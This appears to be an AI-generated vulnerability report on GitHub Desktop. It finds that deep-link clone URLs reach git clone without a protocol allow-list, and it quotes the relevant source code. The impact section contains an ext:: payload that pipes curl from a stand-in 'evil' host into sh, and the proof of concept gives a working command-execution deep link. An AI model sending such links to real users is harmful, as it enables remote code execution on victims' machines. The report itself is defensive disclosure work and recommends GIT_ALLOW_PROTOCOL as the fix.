Based on the investigation, the strongest structural parallel to the original bug (an "unrestricted, attacker-influenced value flows unchecked into a privileged operation, and the codebase's existing safety checks don't cover it") is the handling of **arbitrary remote/clone URLs originating from the `x-github-client://openRepo/...` deep link**, which are passed to `git clone` / `git fetch` without any Git transport-protocol allow-list.

### Title
Deep-link-supplied clone URL is passed to `git clone`/`fetch` without restricting Git transport protocols, enabling `ext::` transport command execution - (File: `app/src/lib/git/clone.ts`)

### Summary
`parseAppURL` accepts an arbitrary string as the repository `url` for the `open-repository-from-url` action, sourced from an OS-level custom-protocol deep link that requires no authentication and can be embedded in any web page or message. That URL is threaded, unsanitized with respect to Git transport scheme, through `Dispatcher.openRepositoryFromUrl` → `openOrCloneRepository`/`openBranchNameFromUrl` into `clone()` and `_fetchRemote`, which invoke `git clone`/`git fetch` on the raw string. Git supports the `ext::<command>` (and `fd::`) transport helper, which executes an arbitrary shell command supplied in the URL itself. Unlike the clone-path checks that were clearly added to defend against directory-traversal (`isClonePathSensitive`, `sanitizeCloneName`, `resolveWithin`), there is no equivalent allow-list for the *scheme* of the remote URL (e.g. `GIT_ALLOW_PROTOCOL`) anywhere in `app/src/lib/git/environment.ts` or `clone.ts`.

### Finding Description
- `parseAppURL` (`app/src/lib/parse-app-url.ts:98-125`) only validates the `branch`/`pr` query values via `testForInvalidChars`/regex; the `url` itself (`parsedPath`) is passed through completely unvalidated. [1](#0-0) 
- `main.ts` wires `open-url` (macOS) and the `--protocol-launcher` Windows argument directly to `handleAppURL`, meaning simply clicking a link with the registered custom scheme reaches this code without further gating. [2](#0-1) 
- `Dispatcher.openRepositoryFromUrl` forwards the URL to `openOrCloneRepository`, `openBranchNameFromUrl`, or `openPullRequestFromUrl` (`app/src/ui/dispatcher/dispatcher.ts:1940-2049`), all of which eventually call `git fetch`/`git clone` on the value. [3](#0-2) 
- `clone()` in `app/src/lib/git/clone.ts` only guards the *destination path* against sensitive locations; the *source* `url` argument is passed straight into `git(['clone', ..., '--', url, path], ...)` with no scheme check. [4](#0-3) 
- `envForRemoteOperation`/`envForProxy` in `app/src/lib/git/environment.ts` only special-case `http(s)://` for proxy resolution; there is no `GIT_ALLOW_PROTOCOL` (or equivalent) environment variable set anywhere to restrict Git's built-in transport helpers. [5](#0-4) 

Git natively supports `ext::<shell-command>` and `fd::` remote helpers designed to let scripts drive arbitrary transports; when a Git client passes an untrusted URL straight to `git clone`/`fetch` without an allow-list, this becomes an OS-command-execution primitive triggered purely by the URL string.

### Impact Explanation
If an attacker crafts a deep link such as `x-github-client://openRepo/ext::sh -c "curl evil/x|sh"` and gets a victim to click it (e.g. from a web page, chat message, or malicious "Open in Desktop" button), the URL propagates into `clone()`/`_fetchRemote` and, absent a protocol allow-list, Git will execute the attacker-controlled command outside any repository sandbox — a full renderer/host code-execution primitive achieved solely via a link click, matching the "attacker controls ... a link or deep link the user clicks" impact category.

### Likelihood Explanation
The deep-link handler (`open-url`/`--protocol-launcher`) is always registered and reachable with zero prior state; the only user action required is clicking a link and then confirming the pre-filled Clone dialog (or, for the `branch`/`pr` deep-link variants, that confirmation is also required before code execution, but the URL itself needs no other sanitization to reach the `clone`/`fetch` call). Because the existing hardening in this codebase (`isClonePathSensitive`, `sanitizeCloneName`, `resolveWithin`) demonstrates the team has already worked to close path-based analogs of this exact bug class but did not add a Git protocol allow-list, this is a plausible, currently-unguarded path.

### Recommendation
Set `GIT_ALLOW_PROTOCOL` (or the modern `protocol.*.allow` config equivalents) in `envForRemoteOperation`/`clone()` to an explicit allow-list (`http`, `https`, `ssh`, `git`) for every code path that accepts a URL originating from outside the app's control (deep links, PR `clone_url`, manually entered clone URLs), rejecting `ext`, `fd`, `file`, and any other transport not explicitly needed.

### Proof of Concept
1. Register/trigger the OS handler for `x-github-client://` (already installed by Desktop).
2. Have the victim click: `x-github-client://openRepo/ext::sh -c "touch /tmp/pwned"`
3. `parseAppURL` returns `{ name: 'open-repository-from-url', url: 'ext::sh -c "touch /tmp/pwned"', branch: null, pr: null, filepath: null }`.
4. `Dispatcher.openRepositoryFromUrl` → `openOrCloneRepository` shows/pre-fills the Clone dialog with this "URL"; once the victim confirms, `clone()` runs `git clone -- 'ext::sh -c "touch /tmp/pwned"' <path>`, causing Git to execute the embedded shell command.

**Note on verification limits:** I was not able to fully confirm the absence of a `GIT_ALLOW_PROTOCOL`/protocol allow-list elsewhere in the codebase (e.g., inside `app/src/lib/git/core.ts` or a global Git config file bundled with the app) due to the scope of files indexed and returned by search. If such a restriction exists outside the files reviewed, this finding would be mitigated; I recommend confirming this in a full local checkout (e.g., via a Devin session) before treating this as conclusively unpatched.

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}

export async function envForRemoteOperation(remoteUrl: string) {
  return {
    ...envForAuthentication(),
    ...(await envForProxy(remoteUrl)),
  }
}

/**
 * Not intended to be used directly. Exported only in order to
 * allow for testing.
 *
 * @param remoteUrl The remote url to resolve a proxy for.
 * @param env       The current environment variables, defaults
 *                  to `process.env`
 * @param resolve   The method to use when resolving the proxy url,
 *                  defaults to `resolveGitProxy`
 */
export async function envForProxy(
  remoteUrl: string,
  env: NodeJS.ProcessEnv = process.env,
  resolve: (url: string) => Promise<string | undefined> = resolveGitProxy
): Promise<Record<string, string | undefined> | undefined> {
  const protocolMatch = /^(https?):\/\//i.exec(remoteUrl)

  // We can only resolve and use a proxy for the protocols where cURL
  // would be involved (i.e http and https). git:// relies on ssh.
  if (protocolMatch === null) {
    return
  }

  // Note that HTTPS here doesn't mean that the proxy is HTTPS, only
  // that all requests to HTTPS protocols should be proxied. The
  // proxy protocol is defined by the url returned by `this.resolve()`
  const proto = protocolMatch[1].toLowerCase() // http or https

  // We'll play it safe and say that if the user has configured
  // the ALL_PROXY environment variable they probably know what
  // they're doing and wouldn't want us to override it with a
  // protocol-specific proxy. cURL supports both lower and upper
  // case, see:
  // https://github.com/curl/curl/blob/14916a82e/lib/url.c#L2180-L2185
  if ('ALL_PROXY' in env || 'all_proxy' in env) {
    log.info(`proxy url not resolved, ALL_PROXY already set`)
    return
  }

  // Lower case environment variables due to
  // https://ec.haxx.se/usingcurl/usingcurl-proxies#http_proxy-in-lower-case-only
  const envKey = `${proto}_proxy` // http_proxy or https_proxy

  // If the user has already configured a proxy in the environment
  // for the protocol we're not gonna override it.
  if (envKey in env || (proto === 'https' && 'HTTPS_PROXY' in env)) {
    log.info(`proxy url not resolved, ${envKey} already set`)
    return
  }

  const proxyUrl = await resolve(remoteUrl).catch(err => {
    log.error('Failed resolving Git proxy', err)
    return undefined
  })

  return proxyUrl === undefined ? undefined : { [envKey]: proxyUrl }
}
